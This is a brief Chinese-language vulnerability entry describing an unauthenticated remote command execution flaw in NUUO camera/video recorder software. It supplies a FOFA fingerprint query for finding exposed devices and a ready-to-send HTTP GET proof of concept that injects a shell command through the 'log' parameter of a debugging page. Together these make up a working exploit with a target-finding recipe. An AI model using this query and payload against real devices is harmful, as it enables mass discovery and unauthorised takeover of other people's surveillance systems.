# NUUO摄像机debugging_center_utils远程代码执行漏洞

NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，NUUO摄像头debugging_center_utils存在未授权命令执行漏洞，攻击者可以获取服务器权限

## fofa

```javascript
body="www.nuuo.com/eHelpdesk.php"
```

## poc

```javascript
GET /__debugging_center_utils___.php?log=;id HTTP/1.1
Host: 
Priority: u=0, i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502201149700.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/uC-qg8DN8MxNGPKaV3Utgw